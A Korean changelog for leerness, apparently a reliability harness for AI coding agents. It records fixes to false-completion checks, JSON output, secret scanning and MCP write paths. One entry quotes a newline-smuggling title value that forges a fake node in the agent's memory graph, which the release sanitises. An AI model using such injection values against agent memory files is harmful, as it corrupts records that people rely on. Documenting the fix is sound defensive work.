- **📖 README 블라인드 재구성**: 3모델이 코드/행위만으로 파악한 정체성 반영(거짓완료 차단 전면화·다언어·경로규칙·한국어 우선).
- **🔬 verify-claim scope-creep 표면화** (Karpathy 원칙3 "외과적 변경"): git 에 변경됐으나 evidence/주장에 없는 파일(요청 범위 밖 변경)을 advisory 로 노출(`--json scopeCreep`).
- doctor 문구 + selftest README exists 가드 (블라인드 P3).

### 검증 (회귀 0)
- **selftest 211 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. scope-creep 행위(claim A + change A,B→[B]), memory search 5종 검색, --json-무명령 비쓰기 재현.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.13.2 — 2026-06-09 — Karpathy 가이드라인 정렬: verify-claim scope-creep 표면화 (외과적 변경)

**🔬 외부 에이전트(Sonnet/Opus) 가 leerness 를 Andrej Karpathy 4대 코딩 가이드라인 대비 검토.** 두 리뷰가 수렴: leerness 는 원칙4(목표주도/검증루프)는 최강이나, **원칙3(외과적 변경)이 최대 갭** — 변경 파일이 요청 범위 내인지 검사가 없었음. 최고가치·최저노력 항목을 즉시 구현(신규 명령 0 — leerness 자신의 원칙2 위반 악화 방지).

### 변경 (UR-0030, Karpathy 원칙3)
- **verify-claim 역방향 git 교차검증**: 기존엔 "주장한 파일이 git 변경에 있는가"(한 방향)만 봤음. 이제 **"git 에 변경됐으나 evidence/주장에 없는 파일"(scope-creep / 요청 범위 밖 변경 신호)** 도 표면화 — `--json scopeCreep` + 사람용 advisory(`🔬 외과적 변경 점검`). 하네스 자체 기록(.harness/.git/node_modules 등) 제외, 오탐 방지 위해 advisory(기본 FAIL 아님). 이미 계산하던 `gitChanged` Set 재사용 — 최소 변경.

### 검증 (회귀 0)
- **selftest 210→211**, 행위 재현: claim a.js + change a.js,b.js → `scopeCreep={count:1,files:["b.js"]}` (.harness 정확 제외).
- 백로그(기존 명령 확장 권장): review-request scope/단순성 신호(원칙1+2, UR-0031) · plan `--done-when` 성공기준(원칙4, UR-0032) · leerness 자체 단순화 검토(원칙2, UR-0033).
- patch(1.13.2) — R-0011 정책상 npm 미배포(GitHub).

## 1.13.1 — 2026-06-09 — 블라인드 3-모델 리뷰 수정 + README 재구성 (codex gpt-5.5 · Sonnet 4.8 · Opus 4.8)

**🔍 블라인드 멀티모델 리뷰**: 3개 모델(codex gpt-5.5 외부 CLI + Claude Sonnet/Opus 4.8 서브에이전트)이 **leerness 소개 없이, README 를 물리적으로 제거(숨김)한 클린룸**에서 npm 최신본(1.13.0)을 코드·CLI·행위만으로 분석. 발견을 맹신 X로 직접 재현·검증해 수정하고, 그 리뷰 내용으로 README 를 재구성.

### 버그 수정 (전부 재현 검증)
- **🔴 memory search 가 lessons/rules 누락** (Sonnet P1): `memory search` 가 5종 메모리 표면을 표방하나 `lessons.md`/`rules.md` 를 검색 못 해(저장한 교훈·룰이 'no matches') 모순감지 핵심 용도가 훼손됐음 → 두 파일 추가. (검증: lesson/rule/decision 3종 모두 검색됨)
- **🔴 옵션-only 무명령의 묵시적 init 쓰기** (codex P1): `leerness --json` 처럼 명령 없이 옵션만 주면 cwd 에 `.harness` 가 의도치 않게 생성되던 쓰기 부작용 → 무명령+옵션만은 help 로 처리(명시 `init` 만 쓰기). bare `leerness` 온보딩은 유지.
- **doctor 문구 + selftest README 의존** (Sonnet/codex/Opus P3): doctor 가 pass 수에 '실패' 를 붙여 "209/210 실패"(=209건 실패로 오독)되던 것 → "통과 N/M (K건 실패)". selftest 의 README 배너 케이스에 `exists` 가드 추가 → 문서가 없는(pruned) 설치에서도 코어 무결성 진단 통과.

### README 재구성 (블라인드 리뷰 기반)
3모델이 코드/행위만으로 파악한 정체성("AI 코딩 에이전트 운영/신뢰성 하네스, 코드를 대신 쓰지 않음")을 반영 — **거짓 완료 차단(핵심 차별점) 섹션 신설**(verify-claim 다언어 인식 포함), selftest 카운트 정정(→210), 경로 규칙(메모리 명령은 `--path`/`./dir`)·한국어-우선 출력 명시.

### 검증 / 잔여
- **selftest 210 PASS** · E2E 365/365. 백로그: bare relative dir cwd-fallback(codex P2, README 경로규칙으로 문서화 + pure 함수 계약 변경은 후속).
- patch(1.13.1, 같은 minor) — R-0011 정책상 npm 미배포(GitHub). Opus 가 "버그처럼 보였으나 자기 테스트 데이터 오류"로 정직하게 철회한 항목은 수정 안 함(과수정 회피).

## 1.13.0 — 2026-06-09 — 🛡️ [안정화/Stable] verify-claim 다언어 + 정직성·자원·보안 안정화

**🛡️ 안정화(Stable) minor. 헤드라인 = verify-claim 다언어 지원(비-JS 개발자 핵심 회귀 수정).** 15번째 멀티에이전트 버그헌트 성과(1.12.2~1.12.5)를 검증·통합해 npm 공개. R-0011 정책의 4번째 minor.

### ⚠️ 동작 변경 (중요)
- **verify-claim 기본 게이트가 Python·Ruby·Go·C#·Java·PHP·Rust 등 비-JS 구현을 인식**합니다(1.12.0 의 게이트는 JS 패턴만 알아 비-JS 정상 완료를 오차단했음). 정직하게 구현한 완료는 언어 무관 통과, 가짜 완료는 여전히 차단.

### 이번 minor 통합 (1.12.2~1.12.5)
- **🌐 verify-claim 다언어 지원** (UR-0014): `OPTIMISM_PATTERNS.codeRe` 에 교차언어 idiom 추가 — 비-JS 정상 done-claim 오차단(exit 1) 제거. 1.12.0 핵심가치의 비-JS 회귀 수정.
- **🔒 MCP 정직성** (UR-0181): unknown tool 호출의 임의경로 쓰기 차단(사용통계 기록을 도구 검증 후로). path-타게팅은 generic 서버 설계로 확인(맹신 X — 과수정 회피).
- **🔍 탐지 정직성** (UR-0182/0183): lazy detect TODO 파일별 추적(무관 task 의 'TODO' 글자 전역 억제 제거) + session close 완료 정직성 advisory(증거 없는 done 노출).
- **🧹 견고성/자원/정확성** (UR-0015~0021): glossary 표 파이프 escape · MCP _chunkSize 클램프(무한루프 데이터손실) · api-skill CRLF/BOM · shell-guard 공백없는 `&&` · 대형파일 stat-before-read(메모리 2배 스파이크) · 중첩 skip-dir 시크릿 오탐 · requirements pip 디렉티브.

### 검증 (회귀 0)
- **selftest 210 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. Python API done-claim→exit 0, 중첩 node_modules 시크릿 제외, MCP unknown tool 쓰기 차단 등 행위 재현.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.12.5 — 2026-06-09 — 15th 버그헌트 잔여 5종: CRLF·shell-guard·메모리·skip-dir·requirements

**🧹 15번째 버그헌트 잔여 클러스터(UR-0017~0021) 일괄 처리 — 견고성/자원/정확성.**

### 변경
- **api-skill CRLF/BOM 복구** (UR-0017, P2): `_loadAPISkill` 가 raw readFileSync 라 CRLF 파일에서 frontmatter 전부 유실 + `api-skill match` 크래시(body undefined). `read()`(BOM strip) + `\r\n`/`\r` 정규화 + fallback 에 `body` 추가(1.9.408 SKILL.md 수정 누락분).
- **shell-guard 공백없는 `&&`/`||` 탐지** (UR-0018, P2): `/\s&&\s/` 가 양쪽 공백을 요구해 `npm run build&&npm test`(PS5.1 에서 실패하는 흔한 형태) 미탐 → 공백 무관 토큰 매칭.
- **대형 파일 stat-before-read** (UR-0019, P2): `_scanCodeForPatterns`·`scan secrets`·`encoding check` 가 size-cap 을 read() **후** 검사해 대형 파일 1개가 메모리 2배 스파이크(200MB→RSS 464MB) → 읽기 **전** stat 으로 초과 파일 건너뜀. verify-claim/gate 메모리 안정화.
- **중첩 skip-dir 제외** (UR-0020, P3): `isSkippedRel` 가 root-anchored 만 매칭해 중첩 `node_modules`/`.git`/`dist` 가 스캔돼 오탐 → 경로 세그먼트 매칭(SCAN_SKIP_DIRS Set).
- **requirements.txt 디렉티브 skip** (UR-0021, P3): `-e`/`-r`/`--hash` pip 디렉티브를 패키지로 파싱하던 것 → `-` 라인 skip + 영숫자 시작 요구.

### 검증 (회귀 0)
- **selftest 209→210**, 행위 재현: api-skill CRLF→"Real Name"+match exit 0, scan secrets 중첩 node_modules/dist/.git 제외(root.js 만 탐지), requirements `["requests","flask"]`.
- 개발 중 발견·수정: `SCAN_SKIP_DIRS` 는 Set(.has) — `.includes` 오용을 selftest 가 배포 전 차단(handoff 보안 스캔 회귀 포함).
- patch(1.12.5, 같은 minor) — R-0011 정책상 npm 미배포. **15번째 버그헌트(UR-0014~0021) 전부 처리 완료.**

## 1.12.4 — 2026-06-09 — 🌐 verify-claim 다언어 지원 + glossary 표/MCP 페이지네이션 (15th 버그헌트 P1/P2)

**🔴 핵심 회귀 수정: verify-claim 기본 게이트가 非JS 정상 완료를 오차단하던 문제.** 15번째 멀티에이전트 버그헌트(크로스플랫폼·최신기능·성능 3관점) 결과 중 즉시-수정 가능한 고가치 3건.

### 변경
- **🔴 verify-claim 다언어 지원** (UR-0014, P1): 1.12.0 의 optimism 기본 게이트가 `OPTIMISM_PATTERNS.codeRe` 를 **JS 전용**으로 두고도 코드 스캐너는 13개 언어를 읽어, Python(`requests`)·Ruby(`Net::HTTP`)·Go(`http.Get`)·C#(`HttpClient`)·Java·PHP·Rust 로 정직하게 구현한 done-claim 을 "호출 흔적 없음"으로 **오차단(exit 1)** 했음. 각 codeRe 에 교차언어 idiom 추가 → 非JS 정상 완료 통과. (검출 관대화 = 정직한 작업 오차단 제거; 과탐보다 안전.)
- **glossary.md 표 파이프 escape** (UR-0015, P2): 표 셀에 `_lineSafe`(개행만 제거) 대신 `_cellSafe`(파이프 escape) 적용 — 의존성 description 의 `|` 가 표 칼럼을 깨뜨리던 문제(node_modules description fallback 벡터).
- **MCP 페이지네이션 _chunkSize 클램프** (UR-0016, P2): 음수/소수 `_chunkSize` → 빈 출력 무한 루프(데이터 손실)였음 → 양의 정수로 클램프.

### 검증 (회귀 0)
- **selftest 207→209**, 행위 재현: Python API done-claim 기본 verify-claim **exit 0**(false-fail 제거), glossary `|`→`\|`, _chunkSize 음수 클램프.
- patch(1.12.4, 같은 minor) — R-0011 정책상 npm 미배포. 15th 잔여(UR-0017~0021): _loadAPISkill CRLF, shell-guard 공백없는 &&, 대형파일 stat-before-read, 중첩 skip-dir, requirements `-` — 후속.

## 1.12.3 — 2026-06-09 — 정직성 마무리: lazy TODO 파일별 추적 + session close 완료 정직성 (14th 버그헌트, UR-0182/0183)

**🔍 14번째 버그헌트 잔여 2건 — 정직성 탐지 정밀화.**

### 변경
- **lazy detect TODO 파일별 추적** (UR-0182): `todo_untracked` 가 아무 task 의 request/evidence 에 'TODO' 글자만 있어도 모든 코드 TODO 경보를 **전역 억제**(무관한 task 1개가 전부 묵음)하던 문제 → 해당 TODO 의 **파일을 참조하는 task 가 없는 것만** 미추적으로 경보. `--auto-track` 도 미추적 TODO 만 등록.
- **session close 완료 정직성 advisory** (UR-0183): 마감 시 done 인데 evidence 가 비었거나 placeholder 인 task 를 노출(`completionHonesty` JSON 필드 + `⚠ 완료 정직성` 라인). 차단하지 않는 advisory(session close 의 advisory 철학) — verify-claim 권장 환기.

### 검증 (회귀 0)
- **selftest 206→208**, 행위 재현: 무관 task 의 'TODO' 글자에도 코드 TODO 경보 유지(untracked=1), session close `completionHonesty.doneWithoutEvidence` 노출.
- patch(1.12.3, 같은 minor) — R-0011 정책상 npm 미배포. **14번째 버그헌트 백로그(UR-0175~0183) 전부 처리 완료.**

## 1.12.2 — 2026-06-09 — MCP unknown-tool 임의경로 쓰기 차단 (14th 버그헌트, UR-0181)

**🧹 MCP 사용통계 기록을 도구 검증 후로 — unknown tool 의 임의 경로 쓰기 차단.**

### 조사 정정 (맹신 X)
외부 에이전트가 "MCP `path` 인자가 서버 루트를 탈출(traversal/정책 우회)"을 P2 보안으로 보고했으나, **직접 조사 + e2e 로 확인 결과 MCP 서버는 generic 설계**임: `mcp serve` 는 cwd 에서 실행되고 각 `tools/call` 의 `path` 로 대상 프로젝트를 지정(의도된 기능 — e2e 가 temp 경로 타게팅을 검증). policy 도 대상-프로젝트별로 path 에서 로드(올바름). 즉 **path-타게팅 자체는 취약점이 아니라 설계**(신뢰된 로컬 MCP 모델). 처음 적용한 "루트 가둠"은 이 설계를 깨 e2e 5건 실패 → **revert**.

### 진짜 버그 수정
- `_bumpMcpUsage`(사용 통계 쓰기)가 **unknown-tool 검증 전**에 실행돼, 미등록 도구 호출로도 임의 경로에 `.harness/cache` 가 생성됐음 → **검증 후(알려진 도구만)로 이동**.

### 검증 (회귀 0)
- **selftest 206→207** (bump 위치 와이어), e2e 365/365. 프로젝트-scoped 가둠은 opt-in 플래그로 별도 검토(backlog).
- patch(1.12.2, 같은 minor) — R-0011 정책상 npm 미배포. 14th 잔여: UR-0182(lazy TODO)·UR-0183(session close 정직성).

## 1.12.1 — 2026-06-08 — 🩹 [Stable hotfix] 클린룸 selftest false-alarm 수정 (UR-0008)

**1.12.0 직후 발견된 사용자-노출 결함 핫픽스 — npm 배포(예외).**

### 문제 (게시본 클린룸 검증으로 발견)
`npm i leerness@1.12.0` 후 `leerness selftest` 실행 시 **"1/206 실패 — 설치 손상 의심"** false-alarm. 패키지는 정상 동작(모든 명령 기능 OK)이나, 무결성 게이트인 selftest 가 거짓 경보 → 정직성이 핵심인 도구의 신뢰 훼손.

### 원인 + 수정
- UR-0151 selftest 케이스가 소스 자기검증에 **멀티라인 exact-string `includes("…\n    …")`**(줄바꿈+정확 4공백)를 사용 → 공백/줄바꿈/환경에 취약(repo 통과, 클린룸 실패).
- → **공백 유연 정규식 `\s+`** 으로 견고화. 로컬 tarball 클린룸 설치 후 **selftest 206/206 통과** 검증(게시 전).

### 배포 정책 예외 (R-0011)
- R-0011(patch 는 npm 미배포)의 **예외 — 직전 게시 minor(1.12.0)의 사용자-노출 결함 안정성 핫픽스**라 npm 배포. dist-tag `stable` 유지.

### 검증 (회귀 0)
- selftest 206(repo) + **206(클린룸 tarball)** · E2E 365/365.

## 1.12.0 — 2026-06-08 — 🛡️ [안정화/Stable] 핵심가치(증거-우선 완료) 복원 + 용어집 안정 minor

**🛡️ 안정화(Stable) minor. 헤드라인 = verify-claim 기본 모드가 허위완료를 차단하도록 복원(동작 변경).** 14번째 멀티에이전트 버그헌트 성과(1.11.1~1.11.4)를 검증·통합해 npm 공개. R-0011 정책의 3번째 minor.

### ⚠️ 동작 변경 (중요)
- **`verify-claim` 기본 모드가 done 주장의 evidence↔코드 일치(optimism)를 게이팅**합니다(이전엔 `--strict-claims` 옵트인). 거짓 코드+빈 테스트로 "완료" 선언 시 **exit 1**로 차단. 정상 코드는 통과(오탐 없음). 기존의 느슨한 동작이 필요하면 **`--lenient`**.

### 이번 minor 통합 (1.11.1~1.11.4)
- **🔴 verify-claim 허위완료 차단** (UR-0175): 기본 모드 fail-open 수정 — leerness 정체성("증거 없으면 완료 불가") 복원. optimism 전체 프로젝트 스캔 + `--json` claimsConsistent/gitCrossCheck 노출 + `--lenient` 탈출.
- **📖 leerness glossary** (UR-0007): 의존성 용어집 — package.json/requirements 라이브러리를 비개발자용 한 줄 설명(한/영)으로. 큐레이션 카탈로그(~40) + node_modules fallback + AI 보완 프롬프트. 외부 3-에이전트 평가 설계.
- **데이터 무결성** (UR-0176/0177): nextId 라인앵커(셀 토큰 오인 행손실 차단) + feature-graph 노드 위조 차단.
- **일관성/무결성** (UR-0178/0179/0180): completed/verified→done 집계 정규화 + rule archive 셀 안전화 + rule ID 재사용 방지.

### 검증 (회귀 0)
- **selftest 206 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. 허위완료→exit 1, 정상완료→exit 0, glossary 5/5.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.11.4 — 2026-06-08 — 📖 leerness glossary: 의존성 용어집 (UR-0007, 외부 3-에이전트 평가 설계)

**🙂 바이브 코딩 지원 — 프로젝트가 쓰는 라이브러리를 비개발자도 알 수 있게 한 줄로.**

### 배경
외부 AI 3-에이전트(제품/기술/회의) 평가 종합: 가이드·기능맵·프로젝트설명은 기존 brief/feature-graph/context-map 와 ~70-80% 중복 → 제외. **유일한 진짜 공백 = 의존성 용어집**(비개발자가 package.json 의 라이브러리를 이해하지 못함). 회의론자의 "무LLM 저품질" 우려는 코드-식별자 추출에만 해당 → **큐레이션 카탈로그**(손작성 고품질)로 해소.

### 신규 `leerness glossary [build|show]`
- `package.json`(deps/devDeps/peerDeps) + `requirements.txt` 의존성을 **큐레이션 도구 카탈로그(`_TOOL_CATALOG`, ~40개)**의 plain-ko/plain-en 한 줄 설명으로 매칭 → `.harness/glossary.md`(이중언어, marker-wrapped, drift-aware) + `glossary.json`.
- 카탈로그 없는 의존성은 **`node_modules/<pkg>` 로컬 description fallback**(오프라인, 네트워크 X).
- 미정의 의존성은 **AI 에이전트가 채울 보완 프롬프트** 생성(leerness 는 LLM 미호출 원칙).
- `--lang ko|en|both`, `--json`. 0 deps, 무LLM, 오프라인.

### 검증 (회귀 0)
- **selftest 205→206** (순수코어 _matchTool/_parsePackageJsonDeps/_buildGlossary/_renderGlossaryMd + 카탈로그 ~40), 행위 재현: 실 deps 픽스처 → 5/5 정의(카탈로그 4 + description fallback 1), 이중언어 출력, --json.
- patch(1.11.4, 같은 minor) — R-0011 정책상 npm 미배포. Phase 2(handoff/MCP/audit 연동, brief --plain)는 후속.

## 1.11.3 — 2026-06-08 — 14th 버그헌트 데이터 일관성 P2 클러스터 (UR-0178/0179/0180)

**🐛 task 집계 일관성 + rule 아카이브 무결성 + ID 재사용 방지.**

### 변경
- **completed/verified 집계 정규화** (UR-0178): `task --status completed|verified` 가 TASK_STATUSES(입력 수락)엔 있으나 STATUSES(집계/버킷 단일출처)엔 없어 total 엔 잡히고 buckets/done% 엔 누락(lazy-detect/idempotency 는 이미 done 취급 — 내부 불일치)됐음 → 저장 시 canonical `done` 으로 정규화(`_normTaskStatus`). 모든 집계 일관.
- **rule 아카이브 셀 안전화** (UR-0179): `rule remove` 가 `rules.archive.md` 에 trigger/rule 을 raw 기록 → 파이프(`|`) 포함 룰이 아카이브 표를 깨뜨렸음(rules.md 는 이미 `_cellSafe`) → 아카이브에도 `_cellSafe`.
- **rule ID 재사용 방지** (UR-0180): `nextRuleId` 가 활성 rules 만 스캔 → `rule remove` 후 같은 R-id 가 다른 룰에 재발급(아카이브 ID 충돌)됐음 → 아카이브의 R-id 도 카운트.

### 검증 (회귀 0)
- **selftest 204→205**, 행위 재현: `--status completed`→저장 `done`+plan progress 집계 일치, rule remove 파이프→아카이브 `\|` escape, rule remove 후 재추가→R-0002(재사용 X).
- patch(1.11.3, 같은 minor) — R-0011 정책상 npm 미배포.

### 비고 (정직)
- stray 테스트 커밋 복구(1.11.2) 과정의 `reset --hard` 가 repo 자체 `.harness/user-requests.json`(한 번도 커밋 안 된 누적 working state)을 비웠음. UR 정본은 CHANGELOG+git 커밋이라 비치명적. 14th 잔여(MCP path/lazy TODO/session close 정직성)는 백로그 유지.

## 1.11.2 — 2026-06-08 — 🔴 핵심가치: verify-claim 기본 모드 허위완료 차단 (14th 버그헌트 P1-CRITICAL, UR-0175)

**🛡️ leerness 정체성 복원 — "증거 없으면 완료 불가"가 기본값에서 작동.** (동작 변경)

### 문제 (직접 재현)
`verify-claim --run-tests`(문서화된 기본 흐름)가 **허위 완료를 통과**시켰음(exit 0): stub 코드 + 아무것도 검증 안 하는 테스트 + 낙관적 evidence → 통과. 허위를 잡는 optimism/git 교차검증이 `--strict-claims` 옵트인일 때만 작동했고, `--json`(에이전트/MCP 경로)은 git 신호조차 누락해 머신 경로가 더 위험했음.

### 변경
- **done 주장 기본 게이팅**: optimism(evidence 주장↔코드 호출 흔적) + 정직성(근거없는 단정) 검사를 done 완료 주장에 **기본 적용**(이전 `--strict-claims` 옵트인 → 이제 done 기본). 완화: `--lenient`. `--json`/human 양 경로 동일 계산 공유.
- **optimism 전체 프로젝트 스캔**: 기존 `src/bin/lib/scripts` 한정 → 루트부터 walk(무거운 디렉토리/예산 상한). routes/app/pages 등 비표준 위치 코드도 인식 → FP(legit 차단)·FN(허위 통과) 동시 해소.
- **--json 신호 노출**: `verdict.claimsConsistent`(optimism+정직성) + `verdict.gitCrossCheck` + `claims`/`git` 상세 → 머신 경로도 human 과 동일하게 정직.
- **git strongMismatch 는 advisory**(기본 게이트 제외, `--strict-claims` 시만 FAIL): 커밋 후 검증(정상 흐름)에서 커밋된 파일이 working-tree 변경에 없어 false-fail 하므로. 기본 게이트는 신뢰도 높은 optimism 이 담당.

### 검증 (회귀 0)
- **selftest 203→204**, 행위 재현: 허위완료(stub) 기본 **exit 1**(차단), 정상완료(실코드) 기본 **exit 0**(false-fail 없음), `--lenient` **exit 0**(탈출), `--json` claimsConsistent/gitCrossCheck 노출.
- patch(1.11.2, 같은 minor) — R-0011 정책상 npm 미배포. **이 동작 변경은 1.12 안정 minor 의 핵심 헤드라인이 됨.**

### 14th 잔여 백로그
UR-0178 completed 집계 · 0179 rule archive escape · 0180 rule ID 재사용 · 0181 MCP path 탈출 · 0182 lazy TODO 억제 · 0183 session close 정직성 게이트.

## 1.11.1 — 2026-06-08 — 데이터 무결성 P1 (14번째 멀티에이전트 버그헌트, UR-0176/0177)

**🐛 데이터 손실·메모리 위조 차단 — leerness 가 보존하는 기록의 무결성 강화.**

### 변경
- **ID 생성 충돌·행 손실 차단** (UR-0176, P1): `nextId` 가 Request 셀 안의 `T-9999` 같은 텍스트 토큰까지 ID 로 매칭 → 다음 ID 가 `T-10000`(5자리)이 되어 4자리 행 정규식에 안 잡혀 **행이 보이지 않게 사라지고 ID 가 중복**되던 문제. 이제 실제 행/헤더(라인 시작) ID 만 카운트 + width-무관 인식.
- **feature 그래프 노드 위조 차단** (UR-0177, P1): `_featureBlock` 가 title/notes/input/output 을 raw 기록 → `title="X\n## F-9999 …"` 로 가짜 노드(헤더) 위조가 가능(메모리 기판 prompt-injection)했음. 모든 보간 값에 `_lineSafe`(개행→공백) — decisions/lessons(UR-0108)와 동일 정책.

### 14번째 버그헌트 — 후속 등록 (이번 미수정, 백로그)
- **UR-0175 (P1-CRITICAL 핵심가치)** verify-claim 기본 모드 fail-open(허위 완료 통과) → 다음 전용 라운드(동작변경·e2e 분석). · UR-0178 completed/verified 미집계 · UR-0179 rule archive 미escape · UR-0180 rule ID 재사용 · UR-0181 MCP path 탈출 · UR-0182 lazy TODO 억제 · UR-0183 session close 정직성 게이트 + feature lock/init-guard 잔여.

### 검증 (회귀 0)
- **selftest 201→203** (nextId 라인앵커 + _featureBlock 주입차단), 행위 재현: T-9999 텍스트 후 ID T-0003/0004(손실 0, list=disk), feature 주입 2노드(위조 차단).
- patch(1.11.1, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

## 1.11.0 — 2026-06-08 — 🛡️ [안정화/Stable] CLI 견고성 + --json 에이전트 계약 안정 minor

**🛡️ 안정화(Stable) minor — 13번째 멀티에이전트 버그헌트로 발견·수정한 patch(1.10.1~1.10.5)를 검증·통합해 npm 에 안정 공개.** R-0011 배포 정책의 2번째 minor 릴리스.

### 이번 minor 에 담긴 개선 (1.10.1~1.10.5, 그동안 GitHub 에만 누적)
- **시크릿 스캐너 정밀화** (UR-0144): AWS 공식 예제키 `AKIA…EXAMPLE`(접미사) 오탐 차단, 중간 example 실키는 보존(FN 정책 유지).
- **--json 에이전트 계약 하드닝** (UR-0146/0173/0174): `init --json` 순수 JSON(배너/진행바/대화 메뉴 억제, io quiet 모드) + `scan secrets`/`encoding check`/`lazy detect`/`deps` 잘못된 경로 구조화 에러(`failJson`, exit 1).
- **정직성·견고성** (UR-0167): `session close <파일>` 가 실패를 성공(exit 0)으로 오판하던 문제 → 구조화 에러 + exit 1.
- **CLI 인자 견고성** (UR-0169): `arg()` 가 값 없이 끝나면 `true` 누출 / 다음 `--flag` 흡수하던 문제 → def 반환(음수값 보존).
- **표·출력 안전화** (UR-0170/0168/0171): plan drop 표셀 `_cellSafe`, handoff --json 배너 억제, env encoding-check positional 디렉토리 존중.

### 검증 (회귀 0)
- **selftest 201 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump(배포) 확인. 13번째 버그헌트 8건 중 7건 수정 + 2건 by-design(UR-0142 intent classify, audit --fix).

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.10.5 — 2026-06-08 — arg() 플래그 흡수 방지 + handoff --json 배너 억제 (13th 버그헌트 잔여, UR-0168/0169)

**🧰 CLI 인자 견고성 + --json 순수성 마무리.**

### 변경
- **arg() 값 플래그 흡수 방지** (UR-0169, P3): `arg(name)` 가 값 없이 끝나면 boolean `true` 를 누출(`--reason` 가 plan.md 에 'true' 기록)하거나, 다음 토큰이 `--flag` 면 그것을 값으로 흡수(`--target --path` → target='--path')하던 문제 → 다음 토큰이 없거나 `--` 장식 플래그면 `def` 반환. **음수 값(`--x -5` 등 단일 `-`)은 보존**.
- **handoff --json 미-init 배너 억제** (UR-0168, P2): `handoff --json` 이 미-init 디렉토리에서 사람용 "init 미실행" 경고를 JSON 앞에 출력(비-JSON)하던 문제 → `--json` 시 배너 억제(순수 JSON).

### 검증 (회귀 0)
- **selftest 199→201** (arg: 흡수방지+음수보존+정상값, handoff 배너 와이어), 행위 재현: `export --target --path` 미흡수, `--reason`(끝) true 누출 없음, `handoff --json` 미-init 순수 JSON.
- arg() 는 코어 함수 → **E2E 365 전수**가 회귀 안전망. patch(1.10.5, 같은 minor) — R-0011 정책상 npm 미배포. (13th 잔여: UR-0172 시크릿 prefix FP — FN 회귀 위험으로 신중 검토 예정)

## 1.10.4 — 2026-06-08 — 13번째 버그헌트 후속 P2/P3 클러스터 (UR-0167/0170/0171)

**🐛 정직성·견고성: 실패 오판 + 표 손상 + 무시되던 인자 수정.**

### 변경
- **session close 디렉토리 가드** (UR-0167, P2-정직성): `session close <파일경로>` 가 `mkdir <path>/.harness` 에서 ENOTDIR 크래시 + **exit 0(실패를 성공으로 오판)** 하던 문제 → 경로 없음/디렉토리 아님이면 `failJson(code:'path_not_found')` + exit 1.
- **plan drop 표셀 안전화** (UR-0170, P3): `plan drop` 의 text/`--reason` 에 든 파이프(`|`)·개행이 plan.md 마크다운 표 칼럼을 깨뜨리던 문제 → `_cellSafe`(task/rule UR-0104 와 동일, round-trip 가능) 적용.
- **env encoding-check positional 디렉토리** (UR-0171, P3): `env encoding-check <dir>` 가 positional 인자를 무시하고 cwd 를 스캔(→ 잘못된 디렉토리 false 'no risk') 하던 문제 → 형제 `env check/sync/detect` 와 동일하게 positional 존중.

### 검증 (회귀 0)
- **selftest 198→199**, 행위 재현: session close 파일경로 → exit 1 + JSON, plan drop 파이프 → `\|` escape(round-trip OK), env encoding-check `<dir>` → scanned 정상.
- patch(1.10.4, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신. (13th 잔여: UR-0168 handoff 배너 · UR-0169 arg 값흡수 · UR-0172 시크릿 prefix FP)

## 1.10.3 — 2026-06-08 — --json 순수성 하드닝 (13번째 멀티에이전트 버그헌트, UR-0173/0174)

**🤖 에이전트 계약 강화: `--json` 이 항상 기계 파싱 가능한 출력만 내도록.**

### 변경
- **init --json TTY 누출 차단** (UR-0173, 1.10.2 회귀): 인터랙티브 터미널에서 `init --json` 이 배너/진행바/언어선택 메뉴를 JSON 앞에 출력하던 문제 → 배너·진행바(`isTty`)에 `!opts.json` 게이트 + `nonInteractive` 적용. 비-TTY(파이프/CI)는 기존에도 정상.
- **walk 기반 스캐너 --json 경로 오류 구조화** (UR-0174): `scan secrets` / `encoding check` / `lazy detect` 가 없는/파일 경로에서 `walk()` throw → 사람용 `✗ ENOENT/ENOTDIR` 텍스트(비-JSON)를 뱉던 문제 → `status()` 패턴(path 가드 + `failJson(code:'path_not_found')`, exit 1) 통일.
- **deps --json 인자누락 구조화** (UR-0174): `deps --json` 의 capability 누락이 사람용 텍스트 → `failJson(code:'missing_arg')`.

### 13번째 버그헌트 — 후속 등록 (이번 미수정, 백로그)
- UR-0167 session close --json 파일경로 exit 0 오판 · UR-0168 handoff --json 미-init 배너 누출 · UR-0169 arg() 값없는 플래그 흡수 · UR-0170 plan drop 파이프 표 깨짐 · UR-0171 env encoding-check positional 무시 · UR-0172 시크릿 prefix+단어 placeholder FP(검토).

### 검증 (회귀 0)
- **selftest 196→198** (4종 --json 구조화 에러 spawn 검증 + init 게이트 와이어), 행위 재현: 4종 모두 `{ok:false,code}` exit 1, init --json TTY 순수 JSON.
- patch(1.10.3, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

## 1.10.2 — 2026-06-08 — init --json 순수 JSON 출력 (12th 외부평가 Codex P3, UR-0146)

**🤖 `init --json` 이 사람용 출력 대신 순수 JSON 요약 1개 — AI 에이전트가 JSON.parse 가능.**

### 변경
- `leerness init --json` 이 기존엔 `--json` 을 silent ignore 하고 배너+15줄 사람용 로그를 출력 → 이제 **순수 JSON 요약**: `{ ok, action:'init', version, path, harnessFiles, dryRun, minimal }`.
- io 에 **quiet 모드(`setQuiet`)** 추가 — `log/ok/warn`(사람용)만 묵음, `fail/failJson`(오류)은 항상 노출. init(install) 큰 핸들러 내부 다중 log 게이팅(침투적) 없이 비침투적 묵음.
- init 디스패치가 `--json` 시 `setQuiet(true)` → install → `finally setQuiet(false)` → JSON 1개 emit (배너/공지 누출 0).

### 검증 (회귀 0)
- **selftest 195→196** (setQuiet: log/ok 묵음 + fail 노출 + 와이어), 행위 재현: `init --json` → 파싱 가능 JSON, 배너 누출 없음.
- patch(1.10.2, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

